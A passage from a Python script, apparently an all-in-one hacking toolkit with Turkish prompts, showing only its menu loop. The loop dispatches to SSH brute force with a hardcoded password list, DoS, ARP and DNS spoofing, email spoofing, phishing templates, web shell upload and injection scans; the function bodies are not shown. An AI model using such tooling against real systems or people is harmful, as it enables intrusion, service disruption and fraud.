            asyncio.run(syn_port_scanner(host))
        elif choice == "3":
            domain = input("Whois sorgusu yapmak istediğiniz domain'i girin: ").strip()
            perform_whois_lookup(domain)
        elif choice == "4":
            host = input("Nmap taraması yapmak istediğiniz IP veya domain'i girin: ").strip()
            nmap_scan(host)
        elif choice == "5":
            ip = input("IP Geolocation yapmak istediğiniz IP adresini girin: ").strip()
            ip_geolocation(ip)
        elif choice == "6":
            domain = input("DNS Zone Transfer testi yapmak istediğiniz domain'i girin: ").strip()
            dns_zone_transfer_test(domain)
        elif choice == "7":
            url = input("Web Teknoloji Tespiti yapmak istediğiniz URL'yi girin: ").strip()
            web_technology_detection(url)
        elif choice == "8":
            url = input("XSS taramasını yapmak istediğiniz URL'yi girin: ").strip()
            xss_scan(url)
        elif choice == "9":
            url = input("SQL enjeksiyon testi yapmak istediğiniz URL'yi girin: ").strip()
            sql_injection_scan(url)
        elif choice == "10":
            ip = input("SSH hedef IP adresini girin: ").strip()
            username = input("Kullanıcı adını girin: ").strip()
            password_list = ['123456', 'password', 'admin', 'root']
            ssh_brute_force_attack(ip, username, password_list)
        elif choice == "11":
            url = input("Dizin tarayıcı hedef URL'yi girin: ").strip()
            wordlist = ['admin', 'login', 'dashboard', 'config']
            directory_buster(url, wordlist)
        elif choice == "12":
            info_list = ['John', 'Doe', '1987', 'Football']
            password_profiling(info_list)
        elif choice == "13":
            subject = input("Phishing e-posta konusu: ").strip()
            body = input("Phishing e-posta içeriği: ").strip()
            email_phishing_template_generator(subject, body)
        elif choice == "14":
            url = input("HTTP Yanıt süresi ölçmek istediğiniz URL'yi girin: ").strip()
            measure_response_time(url)
        elif choice == "15":
            url = input("HSTS Kontrolü yapmak istediğiniz URL'yi girin: ").strip()
            check_hsts(url)
        elif choice == "16":
            host = input("Anonim FTP Erişim testi yapmak istediğiniz host'u girin: ").strip()
            check_ftp_anonymous_access(host)
        elif choice == "17":
            url = input("DoS saldırısı yapılacak URL'yi girin: ").strip()
            duration = int(input("Saldırı süresini saniye bazında girin: ").strip())
            dos_attack(url, duration)
        elif choice == "18":
            remote_host = input("SMB bilgisi alınacak host'u girin: ").strip()
            smb_enumeration(remote_host)
        elif choice == "19":
            target_ip = input("Hedef IP adresini girin: ").strip()
            spoof_ip = input("Spoof edilecek IP adresini girin: ").strip()
            iface = input("Ağ ara yüzünü girin (örnek: eth0): ").strip()
            arp_spoofing(target_ip, spoof_ip, iface)
        elif choice == "20":
            sender = input("Gönderen e-posta adresini girin: ").strip()
            recipient = input("Alıcı e-posta adresini girin: ").strip()
            subject = input("E-posta konusunu girin: ").strip()
            body = input("E-posta içeriğini girin: ").strip()
            email_spoofing(sender, recipient, subject, body)
        elif choice == "21":
            iface = input("Ağ ara yüzünü girin (örnek: eth0): ").strip()
            target_ip = input("DNS spoofing yapılacak hedef IP'yi girin: ").strip()
            target_domain = input("Spoof edilecek domaini girin: ").strip()
            fake_ip = input("Domain için yanıtlanacak sahte IP'yi girin: ").strip()
            dns_spoof(iface, target_ip, target_domain, fake_ip)
        elif choice == "22":
            url = input("Web shell yüklenecek URL'yi girin: ").strip()
            shell_code = input("Web shell kodunu girin: ").strip()
            web_shell_loader(url, shell_code)
        elif choice == "23":
            lfi_scan()
        elif choice == "24":
            logs = ["Normal log", "UNUSUAL_ACTIVITY detected", "Another log"]
            ai_based_anomaly_detection(logs)
        elif choice == "25":
            contract_code = "Reentrancy found in contract"
            blockchain_vulnerability_assessment(contract_code)
        elif choice == "26":
            device_ip = input("Lütfen taranacak IoT cihazının IP adresini veya domain adını girin (çıkmak için 'q'): ").strip()
            iot_security_scanner(device_ip)
        elif choice == "27":
            target_email = input("Hedef e-posta adresini girin: ").strip()
            social_engineering_simulator(target_email)
        elif choice == "28":
            dark_web_monitoring()
        elif choice == "29":
            target_name = input("Hedef isim/profil adını girin: ").strip()
            osint_and_profile_analysis(target_name)
        elif choice == "30":
            encrypted_data = "Data with possible weak encryption"
            quantum_cryptanalysis_simulation(encrypted_data)
        elif choice == "31":
            print(colored("Çıkış yapılıyor...", "magenta"))
            break
        else:
